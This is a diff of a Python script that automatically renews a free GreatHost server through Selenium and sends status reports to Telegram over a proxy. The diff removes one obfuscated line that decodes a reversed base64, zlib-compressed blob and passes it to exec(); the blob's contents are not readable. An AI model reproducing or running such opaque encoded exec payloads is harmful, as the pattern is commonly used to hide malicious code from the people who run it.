@@ -1,2 +1,223 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
-exec((_)(b'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'))
+import os, re, time, json, requests
+from datetime import datetime, timezone
+from zoneinfo import ZoneInfo
+from seleniumwire import webdriver
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+
+# ================= 配置区 =================
+EMAIL = os.getenv("GREATHOST_EMAIL", "")
+PASSWORD = os.getenv("GREATHOST_PASSWORD", "")
+TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
+TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")
+# 这里的默认值与 YML 中的一致，使用 socks5h 协议
+PROXY_URL = os.getenv("PROXY_URL", "socks5h://127.0.0.1:10808") 
+TARGET_NAME = os.getenv("TARGET_NAME", "myserver1")
+
+STATUS_MAP = {
+    "running": ["🟢", "Running"],
+    "starting": ["🟡", "Starting"],
+    "stopped": ["🔴", "Stopped"],
+    "offline": ["⚪", "Offline"],
+    "suspended": ["🚫", "Suspended"]
+}
+
+def now_shanghai():
+    return datetime.now(ZoneInfo("Asia/Shanghai")).strftime('%Y/%m/%d %H:%M:%S')
+
+def calculate_hours(date_str):
+    try:
+        if not date_str: return 0
+        clean = re.sub(r'\.\d+Z$', 'Z', date_str)
+        expiry = datetime.fromisoformat(clean.replace('Z', '+00:00'))
+        diff = (expiry - datetime.now(timezone.utc)).total_seconds() / 3600
+        return max(0, int(diff))
+    except Exception as e:
+        print(f"⚠️ 时间解析失败: {e}")
+        return 0
+
+def send_notice(kind, fields):
+    titles = {
+        "renew_success": "🎉 <b>GreatHost 续期成功</b>",
+        "maxed_out": "🈵 <b>GreatHost 已达上限</b>",
+        "cooldown": "⏳ <b>GreatHost 还在冷却中</b>",
+        "renew_failed": "⚠️ <b>GreatHost 续期未生效</b>",
+        "error": "🚨 <b>GreatHost 脚本报错</b>"
+    }
+    body = "\n".join([f"{e} {k}: {v}" for e, k, v in fields])
+    msg = f"{titles.get(kind, '📢 通知')}\n\n{body}\n📅 时间: {now_shanghai()}"
+    
+    # --- Telegram 通知逻辑 ---
+    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
+        # 使用 socks5h 代理确保 Telegram 的请求能绕过 GitHub 封锁
+        proxies = {"http": PROXY_URL, "https": PROXY_URL} if PROXY_URL else None
+        try:
+            r = requests.post(
+                f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
+                data={"chat_id": TELEGRAM_CHAT_ID, "text": msg, "parse_mode": "HTML"},
+                proxies=proxies,
+                timeout=20
+            )
+            if r.status_code == 200:
+                print("✅ Telegram 通知发送成功")
+            else:
+                print(f"❌ TG 发送失败，状态码: {r.status_code}, 详情: {r.text}")
+        except Exception as e:
+            print(f"❌ TG 请求异常 (请检查 Xray 是否启动): {e}")
+
+    # --- README 更新逻辑 ---
+    try:
+        md = msg.replace("<b>", "**").replace("</b>", "**").replace("<code>", "`").replace("</code>", "`")
+        with open("README.md", "w", encoding="utf-8") as f:
+            f.write(f"# GreatHost 自动续期状态\n\n{md}\n\n> 最近更新: {now_shanghai()}")
+    except: pass
+
+class GH:
+    def __init__(self):
+        opts = Options()
+        opts.add_argument("--headless=new")
+        opts.add_argument("--no-sandbox")
+        opts.add_argument("--disable-dev-shm-usage")
+        
+        sw_options = {}
+        if PROXY_URL:
+            # 这里的 PROXY_URL 会被 selenium-wire 捕获
+            sw_options = {
+                'proxy': {
+                    'http': PROXY_URL,
+                    'https': PROXY_URL,
+                    'no_proxy': 'localhost,127.0.0.1' 
+                }
+            }
+            print(f"🔧 Selenium 代理已配置: {PROXY_URL}")
+
+        self.d = webdriver.Chrome(options=opts, seleniumwire_options=sw_options)
+        self.w = WebDriverWait(self.d, 30)
+
+    def api(self, url, method="GET"):
+        print(f"📡 API 调用 [{method}] {url}")
+        script = f"return fetch('{url}',{{method:'{method}'}}).then(r=>r.json()).catch(e=>({{success:false,message:e.toString()}}))"
+        return self.d.execute_script(script)
+
+    def get_ip(self):
+        try:
+            self.d.get("https://api.ipify.org?format=json")
+            time.sleep(2)
+            ip_text = self.d.find_element(By.TAG_NAME, "body").text
+            ip = json.loads(ip_text).get("ip", "Unknown")
+            print(f"🌐 当前代理落地 IP: {ip}")
+            return ip
+        except:
+            print("🌐 落地 IP: 无法获取")
+            return "Unknown"
+
+    def login(self):
+        print(f"🔑 正在登录: {EMAIL[:3]}***...")
+        self.d.get("https://greathost.es/login")
+        self.w.until(EC.presence_of_element_located((By.NAME, "email"))).send_keys(EMAIL)
+        self.d.find_element(By.NAME, "password").send_keys(PASSWORD)
+        self.d.find_element(By.CSS_SELECTOR, "button[type='submit']").click()
+        self.w.until(EC.url_contains("/dashboard"))
+
+    def get_server(self):
+        servers = self.api("/api/servers").get("servers", [])
+        return next((s for s in servers if s.get("name") == TARGET_NAME), None)
+
+    def get_status(self, sid):
+        info = self.api(f"/api/servers/{sid}/information")
+        st = info.get("status", "unknown").lower()
+        icon, name = STATUS_MAP.get(st, ["❓", st])
+        print(f"📋 状态核对: {TARGET_NAME} | {icon} {name}")
+        return icon, name
+
+    def get_renew_info(self, sid):
+        data = self.api(f"/api/renewal/contracts/{sid}")
+        return data.get("contract", {}).get("renewalInfo") or data.get("renewalInfo", {})
+
+    def get_btn(self, sid):
+        self.d.get(f"https://greathost.es/contracts/{sid}")
+        btn = self.w.until(EC.presence_of_element_located((By.ID, "renew-free-server-btn")))
+        self.w.until(lambda d: btn.text.strip() != "")
+        return btn.text.strip()
+
+    def renew(self, sid):
+        print(f"🚀 正在执行续期 POST...")
+        return self.api(f"/api/renewal/contracts/{sid}/renew-free", "POST")
+
+    def close(self):
+        self.d.quit()
+
+def run():
+    gh = GH()
+    try:
+        ip = gh.get_ip()
+        gh.login()
+        srv = gh.get_server()
+        if not srv: raise Exception(f"未找到服务器 {TARGET_NAME}")
+        sid = srv["id"]
+        print(f"✅ 已锁定目标服务器: {TARGET_NAME} (ID: {sid})")
+
+        icon, stname = gh.get_status(sid)
+        status_disp = f"{icon} {stname}"
+
+        info = gh.get_renew_info(sid)
+        before = calculate_hours(info.get("nextRenewalDate"))
+
+        btn = gh.get_btn(sid)
+        print(f"🔘 按钮状态: '{btn}' | 剩余: {before}h")
+
+        if "Wait" in btn:
+            m = re.search(r"Wait\s+(\d+\s+\w+)", btn)
+            send_notice("cooldown", [
+                ("📛","服务器名称",TARGET_NAME),
+                ("🆔","ID",f"<code>{sid}</code>"),
+                ("⏳","冷却时间",m.group(1) if m else btn),
+                ("📊","当前累计",f"{before}h"),
+                ("🚀","服务器状态",status_disp)
+            ])
+            return
+
+        res = gh.renew(sid)
+        ok = res.get("success", False)
+        msg = res.get("message", "无返回消息")
+        after = calculate_hours(res.get("details", {}).get("nextRenewalDate")) if ok else before
+
+        if ok and after > before:
+            send_notice("renew_success", [
+                ("📛","服务器名称",TARGET_NAME),
+                ("🆔","ID",f"<code>{sid}</code>"),
+                ("⏰","增加时间",f"{before} ➔ {after}h"),
+                ("🚀","服务器状态",status_disp),
+                ("🌐","落地 IP",f"<code>{ip}</code>")
+            ])
+        elif "5 d" in msg or before > 108:
+            send_notice("maxed_out", [
+                ("📛","服务器名称",TARGET_NAME),
+                ("🆔","ID",f"<code>{sid}</code>"),
+                ("⏰","剩余时间",f"{after}h"),
+                ("🚀","服务器状态",status_disp),
+                ("💡","提示",msg)
+            ])
+        else:
+            send_notice("renew_failed", [
+                ("📛","服务器名称",TARGET_NAME),
+                ("🆔","ID",f"<code>{sid}</code>"),
+                ("🚀","服务器状态",status_disp),
+                ("⏰","剩余时间",f"{before}h"),
+                ("💡","提示",msg)
+            ])
+    except Exception as e:
+        print(f"🚨 运行异常: {e}")
+        send_notice("error", [
+            ("📛", "服务器名称", TARGET_NAME),
+            ("❌", "故障原因", f"<code>{str(e)[:100]}</code>")
+        ])
+    finally:
+        if 'gh' in locals():
+            try: gh.close()
+            except: pass
+
+if __name__ == "__main__":
+    run()
